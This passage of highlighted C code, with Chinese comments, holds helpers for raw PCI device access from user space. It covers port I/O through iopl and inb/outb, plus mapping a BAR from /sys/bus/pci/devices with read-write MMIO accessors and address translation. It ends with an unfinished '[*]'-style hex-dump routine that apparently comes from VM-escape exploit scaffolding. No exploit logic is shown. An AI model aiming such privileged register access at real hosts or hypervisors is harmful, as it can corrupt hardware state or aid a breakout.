class="line">    <span class="keyword">if</span> (g_pio.have_iopl) (<span class="type">void</span>)iopl(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_pio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_pio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询已初始化的基址/大小（方便打印或检查） */</span></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.base; &#125;</span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_pio.size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：计算端口号 + 越界检查 */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">pio_port</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">int</span> width, <span class="type">uint16_t</span>* port_out)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_pio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint64_t</span>)off + (<span class="type">uint64_t</span>)width &gt; g_pio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint32_t</span> p = (<span class="type">uint32_t</span>)g_pio.base + off;</span><br><span class="line">    <span class="keyword">if</span> (p &gt; <span class="number">0xFFFF</span>u)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *port_out = (<span class="type">uint16_t</span>)p;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 读写 API —— 8/16/32 位 */</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pio_read8</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">1</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inb(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">pio_read16</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">2</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inw(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pio_read32</span><span class="params">(<span class="type">uint32_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">4</span>, &amp;p)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> inl(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write8</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint8_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">1</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outb(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write16</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">2</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outw(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pio_write32</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint32_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint16_t</span> p;</span><br><span class="line">    <span class="keyword">if</span> (pio_port(off, <span class="number">4</span>, &amp;p)) <span class="keyword">return</span>;</span><br><span class="line">    outl(v, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span>* bar; <span class="comment">// 映射后的虚拟基址</span></span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// 资源真实大小（end - start + 1）</span></span><br><span class="line">    <span class="type">size_t</span> map_len; <span class="comment">// 实际 mmap 的长度（按页对齐）</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span> res_idx; <span class="comment">// 选中的 resource 行号（BAR 号 0..5）</span></span><br><span class="line">    <span class="comment">// 新增：物理信息</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_start; <span class="comment">// 该映射对应的设备物理起始地址（BAR 起点）</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_end; <span class="comment">// 物理结束地址（含端点）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res_flags; <span class="comment">// resource 行里的 flags（可用于判断 WC 等）</span></span><br><span class="line">    <span class="type">bool</span> inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">mmio_ctx_t</span> g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_paths</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* resource_txt, <span class="type">size_t</span> txt_sz,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* dev_dir, <span class="type">size_t</span> dir_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 直接传了 /sys/.../resource 或 /sys/.../resourceN */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="type">char</span>* slash = <span class="built_in">strrchr</span>(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash)</span><br><span class="line">        &#123;</span><br><span class="line">            errno = EINVAL;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 如果传进来的是 resourceN，把它回退到目录再去拼 resource</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(resource_txt, <span class="string">&quot;/resource&quot;</span>) &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &gt;= <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s/resource&quot;</span>, dev_dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 传的是 BDF */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_mem_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* resource_txt, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* start,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* end,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* flags,</span></span><br><span class="line"><span class="params">                         <span class="type">int</span>* picked_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, sel = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s = <span class="number">0</span>, e = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 对外：初始化 / 映射 --- */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> resource_txt[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, <span class="keyword">sizeof</span>(resource_txt),</span><br><span class="line">                    dev_dir, <span class="keyword">sizeof</span>(dev_dir)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;flags, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> size = (<span class="type">size_t</span>)((end - start) + <span class="number">1ULL</span>);</span><br><span class="line">    <span class="type">size_t</span> pg = (<span class="type">size_t</span>)sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> res_path[PATH_MAX];</span><br><span class="line">    <span class="built_in">snprintf</span>(res_path, <span class="keyword">sizeof</span>(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="type">int</span> fd = open(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 MMIO，MAP_SHARED 必须；是否加 MAP_POPULATE 对 MMIO 不关键</span></span><br><span class="line">    <span class="type">void</span>* <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> sv = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = sv;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar = (<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size = size;</span><br><span class="line">    g_mmio.map_len = map_len;</span><br><span class="line">    g_mmio.fd = fd;</span><br><span class="line">    g_mmio.res_idx = res_idx;</span><br><span class="line">    g_mmio.phys_start = (<span class="type">uint64_t</span>)start;</span><br><span class="line">    g_mmio.phys_end = (<span class="type">uint64_t</span>)end;</span><br><span class="line">    g_mmio.res_flags = flags;</span><br><span class="line">    g_mmio.inited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((<span class="type">void</span>*)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_mmio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（虚拟信息） --- */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_bar_index</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.res_idx; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（物理信息） --- */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_start; &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_limit</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_end; &#125; <span class="comment">// inclusive</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* off -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_offset_to_phys</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* VA(映射内某指针) -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_virt_to_phys</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited || !p)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uintptr_t</span> base = (<span class="type">uintptr_t</span>)g_mmio.bar;</span><br><span class="line">    <span class="type">uintptr_t</span> addr = (<span class="type">uintptr_t</span>)p;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; base || addr &gt;= base + g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> off = (<span class="type">size_t</span>)(addr - base);</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：范围检查 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">chk</span><span class="params">(<span class="type">size_t</span> off, <span class="type">size_t</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">mmio_read8</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回映射内某 offset 的可直接访问指针 */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">volatile</span> <span class="type">void</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span>* desc, <span class="type">void</span>* addr, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span>* buf64 = (<span class="type">uint64_t</span>*)addr;</span><br><span class="line">    <span class="type">uint8_t</span>* buf8 = (<span class="type">uint8_t</span>*)addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? 